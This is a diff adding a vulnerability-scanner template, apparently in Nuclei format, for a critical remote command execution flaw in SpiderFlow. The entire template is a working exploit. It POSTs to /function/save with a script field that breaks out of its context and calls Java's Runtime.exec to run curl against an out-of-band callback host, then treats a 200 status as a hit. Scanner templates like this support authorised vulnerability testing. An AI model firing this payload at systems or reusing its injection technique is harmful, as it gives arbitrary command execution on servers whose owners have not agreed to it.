@@ -1,0 +1,24 @@
+id: poc-yaml-spiderflow-save-remote-command-execute
+
+info:
+  name: poc-yaml-spiderflow-save-remote-command-execute
+  author: we1x4n
+  severity: critical
+  tags: xray-converted,rce,ct-469721
+  reference:
+    - https://github.com/GREENHAT7/pxplan/blob/main/goby_pocs/SpiderFlow_save__remote_code.json
+
+http:
+  - raw:
+      - |
+        POST /function/save HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('curl {{reverseURL}}');{
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
